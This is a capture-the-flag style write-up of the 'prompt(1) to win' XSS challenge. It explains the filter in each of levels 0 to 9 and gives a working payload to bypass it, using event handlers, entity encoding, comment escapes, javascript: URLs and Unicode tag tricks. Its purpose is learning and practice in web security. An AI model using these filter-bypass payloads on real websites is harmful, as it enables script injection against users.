# prompt(1) to win
## 0 
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735387-10fb0b9b-deb8-43d9-a7e3-f3289d47f0df.png">

```HTML
<input type="text" value="INPUT">
```


```">``` will close ```<input>``` first.

Then attacker will be able to use prompt(1).


<br>

**Solve**

```HTML
"><script>prompt(1)</script>

```
<img width="1000" src="https://user-images.githubusercontent.com/68285613/147693465-ee262fcc-5b5f-4933-9d9a-e8ab593cf366.png">

<br>

<br>

## 1
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735732-82fe3eb8-1eab-4d58-b603-408f06d90a15.png">


```JavaScript
var stripTagsRE = /<\/?[^>]+>/gi;
input = input.replace(stripTagsRE, '');
```

Need to bypass the ```input.replace``` part.

<br>

**Readings**
- [What's the meaning of /gi in a regex? [duplicate]](https://stackoverflow.com/questions/27916055/whats-the-meaning-of-gi-in-a-regex/27916089)

<br>

**Solve**

*Remember to add a apace behind ```(1)```, so that it will be able to use prompt(1).*

```JavaScript
<svg onload=prompt(1) 
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147695438-906a1682-fb06-4ee3-98b5-bee70ab631a3.png">

<br>

<br>

## 2
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735779-aef522df-531e-46c8-8d08-2792f978598f.png">

```JavaScript
input = input.replace(/[=(]/g, '');
```

Need to bypass the ```input.replace``` part.

<br>

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147696395-81b4a6de-feea-496a-bb89-8b81e591fb87.png">

The ```=``` and ```( ``` are missing.

<br>

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147698634-ab20250b-d195-4650-b70c-38d75363a9db.png">

The ```<h1``` part will make prompt(1) appear on screen.

> ```%40;``` is HTML number of ```(```.

By altering the tag ```<h1``` into other tags, might ended up being able to use prompt(1).

<br>

**Readings**

- [w3schools - svg](https://www.w3schools.com/HTML/html5_svg.asp)

<br>

**Solve**

```HTML
<svg><script>prompt&#40;1)</script>
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147736127-dbe162cc-2d9d-4e90-ba2f-53a9b72ee76a.png">

SVG is XML based, which means that every element is available within the SVG DOM.

<br>

<br>

## 3
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147735869-d4babbf5-7eb8-4c03-bf85-81e9864c331e.png">

```input = input.replace(/->/g, '_');```

Will have use use something other than ```-->``` to close the comment.

<br>

**Solve**

```HTML
--!><svg onload=prompt(1)>
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147734370-19e288b3-e257-41cf-adac-8948e52d21ba.png">

<br>

<br>

## 4
Credit to [Allen Chou](https://github.com/s3131212), can't solve this without you buddy.

**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147736329-66c1b077-32d7-46dc-a91c-68820d5cfa4c.png">

The URL format is " user:password@domain/path?parameter#segment ", however " user:password@ " will usually be omitted.

*By using " http://prompt.ml%2f@DOMAIN_NAME/YOUR_FILE.js " will successfully perform prompt(1).*

- ```%2f``` is the url encode of ```/```.
    - The input condition in ```if()```  is being encoded, however the input is not being encoded in if statement. ```%2f``` will bypass both if condition and statement. 
- YOUR_FILE.js must contain ```prompt(1)```.

> Taking %2f off will not work through if condition, check test.js. 

<br>

**Readings**
- [In search of the perfect URL validation regex](https://mathiasbynens.be/demo/url-regex)

<br>

**Solve**

I don't have a domain, so was not able to use " http://prompt.ml%2f@DOMAIN_NAME/YOUR_FILE.js ".

<br>

<br>

## 5
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147785032-5ff8fff2-f538-4c28-b131-91b61667e15f.png">

```JavaScript
input = input.replace(/>|on.+?=|focus/gi, '_');
```

Need to find a way to put ```prompt(1)``` int ```<input>```.

<br>

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147786300-8a5b2081-2aae-4ded-bcc4-3d1a777cd7d6.png">

```JavaScript
" type=image src onerror="prompt(1)
```

This is not working, because ```replace(/>|on.+?=|focus/gi, '_')```. 

But by moving ```="prompt(1)``` to next line, it will work.

<br>

**Solve**

```JavaScript
" type=image src onerror
="prompt(1)
```


<img width="1000" src="https://user-images.githubusercontent.com/68285613/147786303-774c6d38-bdce-4241-87a2-665344fece7b.png">

<br>

<br>


## 6
**Explain**
<img width="1000" src="https://user-images.githubusercontent.com/68285613/147860405-ca3b7431-5fac-448f-a2fe-bcd2d25f699a.png">

```HTML
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>  
```

and

```e.g. http://httpbin.org/post#{"name":"Matt"}```

are the parts I focused on.

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147876362-6b56c465-40f2-4654-8685-8bb0c9cced1a.png">


```HTML
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147876796-2bd172ef-af1d-45be-acbf-6c5469c7329b.png">

By changing ```name``` to ```action```, it successfully perform prompt(1).

**Solve**

```JavaScript
javascript:prompt(1)#{"action":"Matt"}
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147876796-2bd172ef-af1d-45be-acbf-6c5469c7329b.png">

<br>

<br>

## 7
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147877157-64a3b957-cefd-4cf9-bff4-33cf3a3cc4cb.png">

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147877514-0e592b7d-0ecc-44f6-a845-420cebdd6924.png">

However there's a 12 charaters limit.

So perhaps JavaScript is the place to use prompt(1).

Thus should use ```<script></script>```.

<br>

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147878530-77e63aa2-3f90-4f2b-97ae-489cf99a8a03.png">

- var segments = input.split('#');

What if put # into script?

HTML source will be split.

<br>

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147878636-6a3a22a0-feb8-4c80-af0a-ee61deb7b7c4.png">

The # works like this.

<br>



It's a rather difficult concept for me to understand, so I use [test.js](https://github.com/iitsmel/WebSecurityWriteups/blob/main/prompt(1)towin/tests.js) to test the result.

<br>

**Readings**
- [Template literals (Template strings)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)

<br>

**Solve**
```HTML
"><script>`#`;prompt(1)`#`</script>
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147890015-ab7ca6c7-6bcb-4bda-8dec-913cfbb390c3.png">

<br>

<br>

## 8
**Explain**
<img width="1000" src="https://user-images.githubusercontent.com/68285613/147890264-2e1e9bf2-b6de-4e9d-b4f1-6158158983a4.png">
- input = input.replace(/[\r\n</"]/g, '');

Will have to find another way to do link break.

First find the Unicode of line seperate, then use the function in this challenge to get the correct solution. 

e.g. [test.js](https://github.com/iitsmel/WebSecurityWriteups/blob/main/prompt(1)towin/tests.js)

<br>

**Readings**
- [Notes on Afrikaans](https://www.unicode.org/udhr/n/notes_afr.html)

<br>

**Solve**
```HTML
' prompt(1) -->'
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147932877-50fc038e-23e4-4c3e-a027-51e5afcd4a92.png">


<br>

<br>


## 9
**Explain**

<img width="1000" src="https://user-images.githubusercontent.com/68285613/147934841-ce1bef61-8d6c-4abe-a960-cfc5c65cbb19.png">

From the code below, I know this is something Unicode related.
- input = input.replace(/<([a-zA-Z])/g, '<_$1');

From the code below, I know this is something ASCII code related.
- input = input.toUpperCase();

I use a very simple yet inefficient way to figure this out.

Just simply paste all Unicode characters representing the letter 's' until I found the right one.

<br>

**Readings**
- [Awesome symbols and characters in a bash prompt](https://unix.stackexchange.com/questions/25903/awesome-symbols-and-characters-in-a-bash-prompt)
- [an XSS payload without Alphabetic Characters[alert(1)], for bypass some filters](https://twitter.com/trbughunters/status/1336681843417116672)
- [ascii code](https://www.ascii-code.com)
- [List of Unicode characters](https://en.wikipedia.org/wiki/List_of_Unicode_characters)

<br>

**Solve**

```HTML
<ſvg onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
```

<img width="1000" src="https://user-images.githubusercontent.com/68285613/148045784-23c47fcf-e0c5-46ed-af58-95c13ffbac75.png">

